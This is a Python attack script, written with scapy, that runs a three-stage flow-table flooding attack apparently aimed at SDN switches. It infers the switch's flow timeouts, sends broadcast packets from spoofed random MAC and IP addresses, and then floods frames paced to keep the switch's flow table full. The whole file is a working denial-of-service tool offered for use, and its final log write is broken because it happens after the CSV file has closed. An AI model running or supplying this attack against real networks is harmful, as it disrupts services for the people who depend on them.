#!/usr/bin/env python3
import sys
import json
import argparse
import random
import time
import csv
from scapy.all import sendp

from ftf_utils import FTFUtils

def stage_0(dst_ip, max_iter=1000, max_interval=100):
    hard_timeout = FTFUtils.estimate_hard_timeout(dst_ip, max_iter, max_interval)
    print(f"[*] T_hard={hard_timeout}", flush=True)
    time.sleep(hard_timeout)
    af = FTFUtils.estimate_idle_timeout(dst_ip, max_iter, hard_timeout)
    print(f"[*] T_idle={af}", flush=True)
    return hard_timeout, af

def stage_1(iface, npacket, added_new_packets, attack_frequency):
    packets = []
    macs = []
    for _ in range(npacket):
        src_mac = FTFUtils.random_mac()
        src_ip = FTFUtils.random_ip()
        packet = FTFUtils.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
        macs.append(src_mac)
        packets.append(packet)

    i = 0
    n_pkts = len(packets)
    while i < n_pkts:
        j = FTFUtils.random_anp(added_new_packets)
        sendp(packets[i:i + j], iface=iface, verbose=False)
        time.sleep(FTFUtils.random_af(attack_frequency))
        i += j
        print(f"Packets {i}/{n_pkts}", flush=True)
    return macs

def stage_2(iface, npacket, added_new_packets, attack_frequency, macs):
    local_pool = macs.copy()
    random.shuffle(local_pool)
    packets = []
    for i in range(npacket):
        src_mac = FTFUtils.random_mac()
        src_ip = FTFUtils.random_ip()
        dst_mac = local_pool[i % len(local_pool)]
        dst_ip = FTFUtils.random_ip()
        packets.append(FTFUtils.build_packet(src_mac, src_ip, dst_mac, dst_ip))

    i = 0
    n_pkts = len(packets)
    while i < n_pkts:
        j = FTFUtils.random_anp(added_new_packets)
        sendp(packets[0:i + j], iface=iface, verbose=False)
        time.sleep(FTFUtils.random_af(attack_frequency))
        i += j
        print(f"Packets {i}/{n_pkts}", flush=True)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--iface', required=True)
    parser.add_argument('--dst-ip', required=True, help="Destination IP per stage 0")
    parser.add_argument('--npacket', type=int, required=True)
    parser.add_argument('--anp', type=int, required=True)
    parser.add_argument('--max-iter', type=int, default=1000)
    parser.add_argument('--max-interval', type=int, default=100)
    parser.add_argument('--logs', type=str, default="/tmp/ftf.csv")
    args = parser.parse_args()

    with open(args.logs, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])

    print("# [STAGE 0] T_idle Inference", flush=True)
    hard_timeout, attack_frequency = stage_0(args.dst_ip, args.max_iter, args.max_interval)

    print("# [STAGE 1] MAC Presenting", flush=True)
    macs = stage_1(args.iface, args.npacket, args.anp, attack_frequency)

    print("# [STAGE 2] Flooding", flush=True)
    stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs)

    print("[+] Attacco completato.", flush=True)
    writer.writerow([args.npacket, hard_timeout, attack_frequency])

if __name__ == '__main__':
    main()